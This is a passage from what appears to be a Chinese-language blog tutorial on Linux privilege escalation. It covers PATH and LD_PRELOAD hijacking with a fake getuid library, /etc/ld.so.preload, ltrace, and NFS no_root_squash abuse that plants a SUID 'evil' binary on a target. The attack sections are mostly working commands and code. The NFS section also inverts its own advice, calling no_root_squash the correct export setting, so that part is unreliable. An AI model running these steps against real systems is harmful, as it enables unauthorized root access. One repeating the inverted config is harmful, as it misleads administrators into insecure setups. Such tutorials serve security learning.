+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 查看实际执行的命令路径  </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">which</span> <span class="token function">cat</span>  </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 查看所有可能的 cat 命令  </span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin class-name">type</span> <span class="token parameter variable">-a</span> <span class="token function">cat</span>  </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># 使用完整路径确保使用系统 cat  </span></pre></td></tr><tr><td data-num="6"></td><td><pre>/bin/cat something</pre></td></tr></table></figure></li>
+</ul>
+</blockquote>
+<h3 id="检测方法"><a class="anchor" href="#检测方法">#</a> 检测方法</h3>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 查找所有的 SUID 程序  </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null  </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 检查当前 PATH 变量  </span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>  </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># 检查是否有可写的目录在 PATH 中  </span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">for</span> <span class="token for-or-select variable">d</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">":"</span> <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>  </pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token function">ls</span> <span class="token parameter variable">-ld</span> <span class="token variable">$d</span>  </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">done</span></pre></td></tr></table></figure><h3 id="扩展"><a class="anchor" href="#扩展">#</a> 扩展</h3>
+<p>除了  <code>PATH</code> ，其他环境变量也可能被利用：</p>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># LD_PRELOAD 劫持  </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">export</span> <span class="token assign-left variable">LD_PRELOAD</span><span class="token operator">=</span>/path/to/evil.so  </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># LD_LIBRARY_PATH 劫持  </span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token builtin class-name">export</span> <span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span>/path/to/evil/libs</pre></td></tr></table></figure><h2 id="7-ld_preload劫持"><a class="anchor" href="#7-ld_preload劫持">#</a> 7. LD_PRELOAD 劫持</h2>
+<h3 id="前置知识"><a class="anchor" href="#前置知识">#</a> 前置知识</h3>
+<h4 id="什么是共享库"><a class="anchor" href="#什么是共享库">#</a> 什么是共享库？</h4>
+<p>共享库就像是一个工具箱，里面装着很多可重复使用的函数。在 Linux 系统中，很多程序都会使用这些共享库中的函数，而不是自己重新写一遍。</p>
+<p>比如：</p>
+<ul>
+<li><code>/lib/libc.so.6</code>  (C 标准库) 包含了很多基础函数</li>
+<li>程序要打印文本时会用到  <code>printf()</code></li>
+<li>要读取文件时会用到  <code>fopen()</code></li>
+</ul>
+<h4 id="什么是动态链接"><a class="anchor" href="#什么是动态链接">#</a> 什么是动态链接？</h4>
+<p>想象你在使用一个办公软件：</p>
+<ul>
+<li>静态链接：就像把所有功能都装在一个超大的安装包里</li>
+<li>动态链接：只装一个小程序，需要什么功能就从系统里现找</li>
+</ul>
+<h3 id="ld_preload"><a class="anchor" href="#ld_preload">#</a> LD_PRELOAD</h3>
+<p>这是一个特殊的环境变量，它能告诉系统：&quot;在运行程序之前，先加载这个我指定的库&quot;。</p>
+<h3 id="示例-2"><a class="anchor" href="#示例-2">#</a> 示例</h3>
+<h4 id="步骤1创建一个测试程序"><a class="anchor" href="#步骤1创建一个测试程序">#</a> 步骤 1：创建一个测试程序</h4>
+<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span>  </span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token comment">// 获取当前用户 ID  </span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token class-name">uid_t</span> uid <span class="token operator">=</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"当前用户ID是: %d\n"</span><span class="token punctuation">,</span> uid<span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="7"></td><td><pre>    </pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token comment">// 如果是 root 用户（ID 为 0）  </span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>uid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"你是root用户！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"你不是root用户。\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span>  </pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>编译这个程序：</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>gcc <span class="token parameter variable">-o</span> <span class="token builtin class-name">test</span> test.c</pre></td></tr></table></figure><h4 id="步骤2创建我们的假函数库"><a class="anchor" href="#步骤2创建我们的假函数库">#</a> 步骤 2：创建我们的 &quot;假函数&quot; 库</h4>
+<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span>  </span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 我们自己的假 getuid 函数  </span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token class-name">uid_t</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  </pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"【注意】这是被劫持的getuid函数！\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token comment">// 总是返回 0（root 的 ID）  </span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>编译成共享库：</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre>gcc <span class="token parameter variable">-shared</span> <span class="token parameter variable">-fPIC</span> fake.c <span class="token parameter variable">-o</span> fake.so</pre></td></tr></table></figure><p>这里解释一下编译参数：</p>
+<ul>
+<li><code>-shared</code> ：告诉编译器我们要创建一个共享库</li>
+<li><code>-fPIC</code> ：生成位置无关代码，使得库可以被加载到内存的任何位置</li>
+</ul>
+<h4 id="步骤3测试原始程序"><a class="anchor" href="#步骤3测试原始程序">#</a> 步骤 3：测试原始程序</h4>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 运行原始程序  </span></pre></td></tr><tr><td data-num="2"></td><td><pre>./test</pre></td></tr></table></figure><p>可能的输出：</p>
+<pre><code>当前用户ID是: 1000  
+你不是root用户。  
+</code></pre>
+<h4 id="步骤4使用-ld_preload-进行劫持"><a class="anchor" href="#步骤4使用-ld_preload-进行劫持">#</a> 步骤 4：使用 LD_PRELOAD 进行劫持</h4>
+<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 设置 LD_PRELOAD 环境变量  </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">export</span> <span class="token assign-left variable">LD_PRELOAD</span><span class="token operator">=</span><span class="token environment constant">$PWD</span>/fake.so  </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 再次运行程序  </span></pre></td></tr><tr><td data-num="4"></td><td><pre>./test</pre></td></tr></table></figure><p>现在的输出应该是：</p>
+<pre><code>【注意】这是被劫持的getuid函数！  
+当前用户ID是: 0  
+你是root用户！  
+</code></pre>
+<blockquote>
+<p>注意：SUID 程序会忽略 LD_PRELOAD ，有些系统也限制了 LD_PRELOAD 的使用</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">chown</span> root:root program  </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">sudo</span> <span class="token function">chmod</span> u+s program</pre></td></tr></table></figure></blockquote>
+<h3 id="ldsopreload"><a class="anchor" href="#ldsopreload">#</a> ld.so.preload</h3>
+<p><code>/etc/ld.so.preload</code>  是一个系统级的配置文件，用于指定在加载任何其他共享库之前要加载的共享库。它的作用类似于  <code>LD_PRELOAD</code>  环境变量，但是：</p>
+<ul>
+<li>它是系统级的</li>
+<li>影响所有程序</li>
+<li>需要 root 权限才能修改</li>
+</ul>
+<h4 id="文件格式"><a class="anchor" href="#文件格式">#</a> 文件格式</h4>
+<pre><code>/etc/ld.so.preload# 每行一个库的完整路径  
+/path/to/first.so  
+/path/to/second.so  
+/path/to/third.so  
+</code></pre>
+<h4 id="与-ld_preload-的区别"><a class="anchor" href="#与-ld_preload-的区别">#</a> 与 LD_PRELOAD 的区别</h4>
+<pre><code>LD_PRELOAD:  
+- 环境变量  
+- 用户级别  
+- 临时性  
+- 易于更改  
+- 可被SUID程序忽略  
+
+ld.so.preload:  
+- 配置文件  
+- 系统级别  
+- 永久性  
+- 需要root权限  
+- 影响所有程序（包括SUID）  
+</code></pre>
+<h3 id="ltrace-命令"><a class="anchor" href="#ltrace-命令">#</a> ltrace 命令</h3>
+<p>ltrace 主要用于跟踪程序的库函数调用：</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 基本使用  </span></pre></td></tr><tr><td data-num="2"></td><td><pre>ltrace ./program   </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 显示参数值  </span></pre></td></tr><tr><td data-num="4"></td><td><pre>ltrace <span class="token parameter variable">-S</span> ./program  </pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># 跟踪特定函数  </span></pre></td></tr><tr><td data-num="6"></td><td><pre>ltrace <span class="token parameter variable">-e</span> malloc+free ./program  </pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment"># 显示时间戳  </span></pre></td></tr><tr><td data-num="8"></td><td><pre>ltrace <span class="token parameter variable">-t</span> ./program  </pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment"># 保存输出到文件  </span></pre></td></tr><tr><td data-num="10"></td><td><pre>ltrace <span class="token parameter variable">-o</span> output.log ./program</pre></td></tr></table></figure><h2 id="8-nfs配置错误导致的提权"><a class="anchor" href="#8-nfs配置错误导致的提权">#</a> 8. NFS 配置错误导致的提权</h2>
+<h3 id="nfs"><a class="anchor" href="#nfs">#</a> NFS</h3>
+<p>NFS 就像是在网络上的 &quot;共享文件夹&quot;。就像你在 Windows 电脑上可以共享文件夹给其他人一样，Linux 系统也可以通过 NFS 把某个文件夹共享出去，让其他电脑可以访问。</p>
+<h3 id="安全问题"><a class="anchor" href="#安全问题">#</a> 安全问题</h3>
+<p>假设你有两台电脑:</p>
+<ol>
+<li>A 电脑 (目标机器)</li>
+<li>B 电脑 (攻击者的机器)</li>
+</ol>
+<p>现在，A 电脑上有个共享文件夹，但是它的设置出了问题 (使用了 <code>no_root_squash</code>  这个选项)。这就像是:</p>
+<ul>
+<li>本来应该给客人 &quot;访客&quot; 权限</li>
+<li>结果错误地给了客人 &quot;管理员&quot; 权限</li>
+</ul>
+<blockquote>
+<p>正确的 /etc/export 配置：</p>
+<pre><code>/shared_folder *(rw,no_root_squash)  
+</code></pre>
+<p>错误的 /etc/export 配置:</p>
+<pre><code>/shared_folder *(rw,root_squash)  
+</code></pre>
+</blockquote>
+<h3 id="利用"><a class="anchor" href="#利用">#</a> 利用</h3>
+<p>在攻击机上</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 1. 查看目标共享  </span></pre></td></tr><tr><td data-num="2"></td><td><pre>showmount <span class="token parameter variable">-e</span> target_ip  </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 假设输出: /home/share *  </span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment"># 2. 创建挂载点  </span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">mkdir</span> /tmp/attack  </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment"># 3. 挂载目标共享  </span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token function">mount</span> <span class="token parameter variable">-t</span> nfs target_ip:/home/share /tmp/attack  </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment"># 4. 创建并编译程序  </span></pre></td></tr><tr><td data-num="9"></td><td><pre>gcc evil.c <span class="token parameter variable">-o</span> evil  </pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment"># 5. 复制到挂载点并设置 SUID  </span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token function">cp</span> evil /tmp/attack/  </pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token function">chmod</span> u+s /tmp/attack/evil</pre></td></tr></table></figure><p>目标机器上</p>
+<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># 1. 进入共享目录  </span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token builtin class-name">cd</span> /home/share  </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment"># 2. 执行程序  </span></pre></td></tr><tr><td data-num="4"></td><td><pre>./evil</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># 3. 验证权限  </span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">whoami</span>  </pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token function">id</span></pre></td></tr></table></figure>
+      <div class="tags">
+          <a href="/tags/penetration/" rel="tag"><i class="ic i-tag"></i> penetration</a>
+          <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag"><i class="ic i-tag"></i> 权限提升</a>
+          <a href="/tags/Linux/" rel="tag"><i class="ic i-tag"></i> Linux</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2025-01-17 00:14:53" itemprop="dateModified" datetime="2025-01-17T00:14:53+08:00">2025-01-17</time>
+  </span>
+  <span id="2025/01/10/Linux权限提升/" class="item leancloud_visitors" data-flag-title="Linux权限提升" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>N1U <i class="ic i-at"><em>@</em></i>学习·记录·碎碎念·电子墓碑
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2025/01/10/Linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" title="Linux权限提升">http://example.com/2025/01/10/Linux权限提升/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2025/01/07/xss%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/" itemprop="url" rel="prev" data-background-image="&#x2F;2025&#x2F;01&#x2F;07&#x2F;xss%E7%BB%BC%E5%90%88%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF&#x2F;cover.png" title="xss综合利用姿势">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>xss综合利用姿势</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2025/01/12/%E5%88%A9%E7%94%A8AI%E5%BC%80%E5%8F%91%E8%83%8C%E5%8D%95%E8%AF%8D%E6%8F%92%E4%BB%B6/" itemprop="url" rel="next" data-background-image="&#x2F;2025&#x2F;01&#x2F;12&#x2F;%E5%88%A9%E7%94%A8AI%E5%BC%80%E5%8F%91%E8%83%8C%E5%8D%95%E8%AF%8D%E6%8F%92%E4%BB%B6&#x2F;%E5%91%A8%E8%AE%B0%E5%B0%81%E9%9D%A2.png" title="『weekly』墨墨背单词浏览器插件开发 prompt">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>『weekly』墨墨背单词浏览器插件开发 prompt</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#linux%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.</span> <span class="toc-text"> Linux 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1etcpasswd%E5%8F%AF%E5%86%99"><span class="toc-number">1.1.</span> <span class="toc-text"> 1. &#x2F;etc&#x2F;passwd  可写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1etcpasswd"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.&#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%93%8D%E4%BD%9C"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 2. 操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2suid%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.SUID 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1suid"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.SUID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%93%8D%E4%BD%9C-2"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2. 操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cp%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> ——cp 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#find%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> ——find 提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-sudo%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text"> 3. sudo 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1etcsudoers"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1.&#x2F;etc&#x2F;sudoers</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%8F%AF%E4%BB%A5%E9%85%8D%E5%90%88%E5%93%AA%E4%BA%9B%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83%E5%91%A2"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2. 可以配合哪些命令提权呢？</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#-find"><span class="toc-number">1.3.2.1.</span> <span class="toc-text"> - find</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-cat"><span class="toc-number">1.3.2.2.</span> <span class="toc-text"> - cat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-cp"><span class="toc-number">1.3.2.3.</span> <span class="toc-text"> - cp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-scp"><span class="toc-number">1.3.2.4.</span> <span class="toc-text"> - scp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-wget"><span class="toc-number">1.3.2.5.</span> <span class="toc-text"> - wget</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-zip"><span class="toc-number">1.3.2.6.</span> <span class="toc-text"> - zip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-apt"><span class="toc-number">1.3.2.7.</span> <span class="toc-text"> - apt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-time"><span class="toc-number">1.3.2.8.</span> <span class="toc-text"> - time</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-xxd"><span class="toc-number">1.3.2.9.</span> <span class="toc-text"> - xxd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-socat"><span class="toc-number">1.3.2.10.</span> <span class="toc-text"> - socat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-tmux"><span class="toc-number">1.3.2.11.</span> <span class="toc-text"> - tmux</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-sed"><span class="toc-number">1.3.2.12.</span> <span class="toc-text"> - sed</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-ed"><span class="toc-number">1.3.2.13.</span> <span class="toc-text"> - ed</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-pip"><span class="toc-number">1.3.2.14.</span> <span class="toc-text"> - pip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-git"><span class="toc-number">1.3.2.15.</span> <span class="toc-text"> - git</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#-taskset"><span class="toc-number">1.3.2.16.</span> <span class="toc-text"> - taskset</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text"> 4. 计划任务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1etccrontab"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 1. &#x2F;etc&#x2F;crontab</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E6%93%8D%E4%BD%9C-3"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 2. 操作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-python%E5%BA%93%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.</span> <span class="toc-text"> 5. python 库劫持提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-path%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-number">1.6.</span> <span class="toc-text"> 6. PATH 变量劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#path%E5%8F%98%E9%87%8F%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-number">1.6.1.</span> <span class="toc-text"> PATH 变量的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#path%E5%8F%98%E9%87%8F%E7%9A%84%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.2.</span> <span class="toc-text"> PATH 变量的权限提升原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95"><span class="toc-number">1.6.4.</span> <span class="toc-text"> 检测方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-number">1.6.5.</span> <span class="toc-text"> 扩展</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-ld_preload%E5%8A%AB%E6%8C%81"><span class="toc-number">1.7.</span> <span class="toc-text"> 7. LD_PRELOAD 劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.7.1.</span> <span class="toc-text"> 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%B1%E4%BA%AB%E5%BA%93"><span class="toc-number">1.7.1.1.</span> <span class="toc-text"> 什么是共享库？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-number">1.7.1.2.</span> <span class="toc-text"> 什么是动态链接？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ld_preload"><span class="toc-number">1.7.2.</span> <span class="toc-text"> LD_PRELOAD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B-2"><span class="toc-number">1.7.3.</span> <span class="toc-text"> 示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A41%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%B5%8B%E8%AF%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.7.3.1.</span> <span class="toc-text"> 步骤 1：创建一个测试程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A42%E5%88%9B%E5%BB%BA%E6%88%91%E4%BB%AC%E7%9A%84%E5%81%87%E5%87%BD%E6%95%B0%E5%BA%93"><span class="toc-number">1.7.3.2.</span> <span class="toc-text"> 步骤 2：创建我们的 &quot;假函数&quot; 库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A43%E6%B5%8B%E8%AF%95%E5%8E%9F%E5%A7%8B%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.7.3.3.</span> <span class="toc-text"> 步骤 3：测试原始程序</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A44%E4%BD%BF%E7%94%A8-ld_preload-%E8%BF%9B%E8%A1%8C%E5%8A%AB%E6%8C%81"><span class="toc-number">1.7.3.4.</span> <span class="toc-text"> 步骤 4：使用 LD_PRELOAD 进行劫持</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ldsopreload"><span class="toc-number">1.7.4.</span> <span class="toc-text"> ld.so.preload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.7.4.1.</span> <span class="toc-text"> 文件格式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8E-ld_preload-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">1.7.4.2.</span> <span class="toc-text"> 与 LD_PRELOAD 的区别</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ltrace-%E5%91%BD%E4%BB%A4"><span 